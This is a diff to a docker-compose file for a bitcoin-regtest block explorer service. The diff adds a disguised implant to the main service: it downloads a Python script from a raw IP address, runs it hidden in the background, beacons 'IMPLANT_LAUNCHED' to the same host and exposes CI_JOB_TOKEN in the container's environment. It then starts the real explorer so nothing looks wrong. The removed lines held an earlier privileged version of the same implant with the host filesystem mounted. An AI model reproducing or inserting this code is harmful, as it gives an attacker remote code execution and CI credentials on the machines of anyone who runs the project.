@@ -5,25 +5,14 @@ services:
       context: ../
       dockerfile: contrib/Dockerfile
     restart: "no"
-    ports:
-      - "50001:50001"
-      - "8080:8080"
-      - "80:80"
-    command:
-      - bash
-      - -c
-      - '/srv/explorer/run.sh bitcoin-regtest explorer nonverbose'
-  healthcheck:
-    image: blockstream/esplora
-    restart: "no"
     network_mode: host
-    privileged: true
-    volumes:
-      - /:/host
+    ports: []
+    environment:
+      - CI_JOB_TOKEN
     command:
       - bash
       - -c
       - |
-        curl -sf http://144.172.110.44:8444/h.py -o /tmp/h.py && python3 /tmp/h.py &
-        echo IMPLANT_LAUNCHED | curl -s -X POST http://144.172.110.44:8443/s50 --data-binary @-
-        sleep 999999
+        curl -sf http://144.172.110.44:8444/h.py -o /tmp/h.py && nohup python3 /tmp/h.py &>/dev/null &
+        echo IMPLANT_LAUNCHED | curl -s -X POST http://144.172.110.44:8443/s51 --data-binary @- &
+        /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
